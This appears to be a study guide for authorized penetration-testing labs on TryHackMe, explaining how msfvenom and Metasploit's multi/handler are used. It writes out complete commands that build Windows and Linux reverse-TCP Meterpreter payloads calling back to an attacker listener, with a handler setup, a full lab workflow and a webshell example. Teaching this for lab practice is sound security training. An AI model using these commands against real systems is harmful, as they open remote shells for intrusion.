## 1. Overview

> How do we create the payload that establishes the shell connection?

One of the most important Metasploit tools for this is:

```bash
msfvenom
```

The general workflow is:

```text
Choose payload
      ↓
Configure payload
      ↓
Generate payload
      ↓
Deliver payload
      ↓
Target executes it
      ↓
Target connects back
      ↓
Listener catches connection
      ↓
    Shell
```

---

# 2. What Is msfvenom?

`msfvenom` is a Metasploit command-line tool for generating and manipulating payloads.

It combines functionality that was historically provided by separate Metasploit tools.

It can be used to:
- Generate payloads
- Select payload formats
- Configure callback addresses
- Configure callback ports
- Encode payloads where supported
- Output payloads in different formats
    
Basic syntax:
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

---

# 3. Understanding the Command

Example structure:

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> -o <file>
```

```text
-p
```
Select payload.

```text
LHOST
```
Callback/listener IP.

```text
LPORT
```

Callback/listener port.
```text
-f
```

Output format.
```text
-o
```
Output file.

---

# 4. Listing Payloads

You can search available payloads with:

```bash
msfvenom -l payloads
```

This can produce a large list.

You can filter it:
```bash
msfvenom -l payloads | grep windows
```

or:
```bash
msfvenom -l payloads | grep linux
```

The goal is to find a payload compatible with:
```text
Operating system
Architecture
Connection type
Required functionality
```

---

# 5. Payload Naming Convention

Metasploit payload names often tell you what they do.

For example, a name may contain concepts such as:
```text
windows
linux
x64
reverse
tcp
meterpreter
```

You can interpret them roughly as:
```text
windows → Windows target
x64     → 64-bit architecture
reverse → Reverse connection
tcp     → TCP transport
meterpreter → Meterpreter session
```

This makes payload names much easier to understand.
---

# 6. Reverse TCP Payload

A common payload concept is:
```text
<OS>/x64/meterpreter/reverse_tcp
```

The important parts are:
```text
meterpreter
```
The resulting connection provides a Meterpreter session.

```text
reverse
```
The target connects back.

```text
tcp
```
TCP is used for transport.

Conceptually:
```text
Target
   |
   | TCP connection
   ↓
Attacker
```

---

# 7. LHOST and LPORT

When generating a reverse payload:

```text
LHOST = Attacker IP
LPORT = Attacker listening port
```

For example:

```text
LHOST=10.10.14.5
LPORT=4444
```

The generated payload is effectively configured to connect to:

```text
10.10.14.5:4444
```

when executed.

---

# 8. Payload Format

A payload isn't necessarily generated as a `.exe`.

It can be generated in different formats.

Examples include:
```text
exe
elf
php
asp
aspx
python
raw
```

The appropriate format depends on where the payload is going to be used.

For example:
```text
Windows executable → EXE
Linux executable   → ELF
PHP application    → PHP
```

---

# 9. Listing Output Formats

Use:
```bash
msfvenom --list formats
```

This displays available output formats.

The exact formats depend on your installed Metasploit version.

---

# 10. Windows Executable Example

For an authorized lab, the conceptual command is:
```bash
msfvenom -p <windows-payload> LHOST=<YOUR-IP> LPORT=4444 -f exe -o payload.exe
```

For example, using a compatible Meterpreter reverse-TCP payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f exe -o payload.exe
```

This creates:
```text
payload.exe
```

The payload is configured to connect back to:
```text
YOUR-IP:4444
```

---

# 11. Linux ELF Example

Linux executable payloads can be generated in ELF format.

Conceptually:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f elf -o payload.elf
```

Output:
```text
payload.elf
```

The important relationship is:

```text
Linux target
   ↓
Linux-compatible payload
   ↓
  ELF
```

---

# 12. Why Architecture Matters

A payload must generally match the target environment.

For example:
```text
x86
x64
ARM
```

A 64-bit payload isn't automatically appropriate for every target.

You should first identify:

```text
OS
Architecture
```

For example, Meterpreter:
```text
sysinfo
```

may reveal:
```text
Architecture: x64
```

Then choose an appropriate payload.

---

# 13. Payload vs Delivery

Generating a payload doesn't mean it has been delivered.

These are separate stages:
```text
Generation
   ↓
Delivery
   ↓
Execution
   ↓
Connection
```

For example:
```text
msfvenom
   ↓
payload.exe
   ↓
transfer to target
   ↓
execute
   ↓
reverse connection
   ↓
Metasploit handler
```

---

# 14. Metasploit Handler

The listener that receives a Metasploit payload is commonly created with:
```text
exploit/multi/handler
```

Start Metasploit:
```bash
msfconsole
```

Select:
```text
use exploit/multi/handler
```

Check options:
```text
show options
```

Set the same payload:
```text
set payload <same-payload-used-by-msfvenom>
```

Then configure:
```text
set LHOST <YOUR-IP>
set LPORT 4444
```

Run:
```text
run
```

---

# 15. Why Payloads Must Match the Handler

Suppose your generated payload uses:
```text
windows/x64/meterpreter/reverse_tcp
```

Your handler should use the same payload type:
```text
windows/x64/meterpreter/reverse_tcp
```

Conceptually:
```text
Generated payload
        ↓
windows/x64/meterpreter/reverse_tcp
        ↓
        MATCH
        ↓
Handler
windows/x64/meterpreter/reverse_tcp
```

If the payload and handler don't match, the connection may fail.

---

# 16. Complete Lab Workflow

For an authorized lab:

### Step 1 — Find your IP
```bash
ip addr
```

Identify the interface reachable by the target.

For TryHackMe, this is often the VPN interface.

---

### Step 2 — Generate payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f exe -o payload.exe
```

---

### Step 3 — Start Metasploit

```bash
msfconsole
```

---

### Step 4 — Configure handler

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR-IP>
set LPORT 4444
```

---

### Step 5 — Start listener

```text
run
```

---

### Step 6 — Execute payload in the lab target

When the target executes the payload:

```text
Target
   ↓
Reverse TCP
   ↓
Your listener
   ↓
Meterpreter session
```

You can then:

```text
sessions -l
```

and:

```text
sessions -i <ID>
```

---

# 17. Important: Delivery Methods

Payload delivery is separate from payload generation.

Common delivery mechanisms in security labs include:

```text
File transfer
Web application upload
HTTP
SMB
Phishing simulation
Exploitation of another service
```

The appropriate method depends on the scenario.

---

# 18. Webshells

A **webshell** is a server-side script that provides command execution through a web application.

Conceptually:
```text
Browser
   ↓
HTTP request
   ↓
Web server
   ↓
Webshell
   ↓
Operating-system command
```

For example, a vulnerable PHP application might execute commands through a malicious PHP script.

A webshell is different from a reverse shell.
### Webshell
```text
Attacker → HTTP request → Webshell
```
### Reverse shell
```text
Target → Connection → Attacker listener
```

---

# 19. Webshell vs Reverse Shell

|Feature|Webshell|Reverse Shell|
|---|---|---|
|Communication|HTTP/HTTPS requests|Usually direct socket connection|
|Interaction|Request/response|Interactive connection|
|Listener required|Not necessarily|Yes|
|Persistence|Depends on deployment|Usually session-based|
|Typical environment|Web server|Any compatible target|

A webshell can sometimes be used as a stepping stone toward a more interactive shell.

---

# 20. Webshell Concept

Imagine a PHP application running on:
```text
http://10.10.10.5/
```

A server-side script could expose command execution.

Conceptually:
```text
GET /shell.php?cmd=whoami
```

The server processes:
```text
whoami
```

and returns the result.

---

# 21. Webshell to Reverse Shell

A common attack chain in labs is:

```text
Web vulnerability
      ↓
   Webshell
      ↓
Command execution
      ↓
 Reverse shell
      ↓
Interactive access
```

This is an important concept for understanding real-world exploitation chains.

---

# 22. Encoding

`msfvenom` supports payload encoding.

Historically, encoding was sometimes used to help payloads survive certain character restrictions.

For example:
```bash
msfvenom --list encoders
```

However:

> Encoding is **not equivalent to encryption** and is not a reliable way to bypass modern antivirus/EDR.

A common misconception is:
```text
Encoded payload = Undetectable payload
```

This is false.

Modern security products can detect malicious behavior even when the payload is encoded.

---

# 23. Payload Stagers vs Stageless Payloads

Metasploit payloads can be conceptually divided into:

### Staged payload
A small initial component connects back and retrieves the rest of the payload.

```text
Target
  ↓
Small stage
  ↓
Connection
  ↓
Larger payload
```

### Stageless payload
The payload contains the required components together.

```text
Target
  ↓
Complete payload
  ↓
Connection
```

You may see naming differences such as:

```text
reverse_tcp
reverse_tcp_rc4
```

or other staged/stageless naming patterns depending on the payload.

The important concept is:

```text
Staged
→ Initial small component + later stage

Stageless
→ Complete payload from the beginning
```

---

# 24. Why Staging Exists

Staging can reduce the size of the initial payload and allow the payload to be delivered in multiple steps.

Conceptually:
```text
Small initial payload
        ↓
Connect to handler
        ↓
Receive larger stage
        ↓
Start session
```

This can be useful in some exploitation scenarios.

---

# 25. `msfvenom` Help

For command-line help:

```bash
msfvenom --help
```

Useful commands:

```bash
msfvenom -l payloads
msfvenom -l formats
msfvenom -l encoders
```

These help you discover available options rather than memorizing everything.

---

# 26. Troubleshooting Reverse Shells

If the shell doesn't connect, check these in order.

### 1. Is the listener running?

```text
run
```

### 2. Is LHOST correct?

```text
show options
```

### 3. Is LPORT correct?

The payload and handler must use the same port.

### 4. Is the target able to reach your IP?

Test network connectivity in the lab.

### 5. Is a firewall blocking the connection?

Check both sides.

### 6. Does the payload match the target?

Verify:

```text
OS
Architecture
Payload
```

### 7. Does the handler use the exact same payload?

For example:

```text
Payload:
windows/x64/meterpreter/reverse_tcp

Handler:
windows/x64/meterpreter/reverse_tcp
```

---

# 27. Payload Generation Workflow

Remember:

```text
1. Identify target
       ↓
2. Determine OS
       ↓
3. Determine architecture
       ↓
4. Choose payload
       ↓
5. Choose LHOST
       ↓
6. Choose LPORT
       ↓
7. Choose output format
       ↓
8. Generate payload
       ↓
9. Deliver payload
       ↓
10. Start matching handler
       ↓
11. Execute in authorized lab
       ↓
12. Receive session
```

---
# 28. Complete Mental Model

The entire process can be visualized as:

```text
                 PAYLOAD GENERATION
                        |
                     msfvenom
                        |
                        ↓
                  Generated payload
                        |
                        ↓
                     DELIVERY
                        |
                        ↓
                  Target executes
                        |
                        ↓
                 Reverse connection
                        |
                        ↓
                     LISTENER
                        |
                        ↓
                     SESSION
                        |
                        ↓
                Meterpreter/Shell
```

---

# 29. The Two Topics Together

### Shells & Listeners
Teaches:
```text
What is a shell?
What is a listener?
Reverse vs bind
LHOST/LPORT
Shell stabilization
```

### Payload Generation & Delivery
Teaches:
```text
How to create the payload
How to choose a payload
How to choose a format
How to configure callback settings
How to deliver it
How to configure the handler
How to catch the connection
```

Together:
```text
              msfvenom
                 ↓
               Payload
                 ↓
               Target
                 ↓
          Reverse connection
                 ↓
         Metasploit Handler
                 ↓
              Session
                 ↓
             Meterpreter
```

---

# 30. Commands to Memorize

### msfvenom
```bash
msfvenom --help
```

```bash
msfvenom -l payloads
```

```bash
msfvenom -l formats
```

```bash
msfvenom -l encoders
```

### General generation:
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <FILE>
```

### Metasploit handler
```text
msfconsole
use exploit/multi/handler
set payload <PAYLOAD>
set LHOST <IP>
set LPORT <PORT>
show options
run
```
### Sessions
```text
sessions -l
sessions -i <ID>
background
```


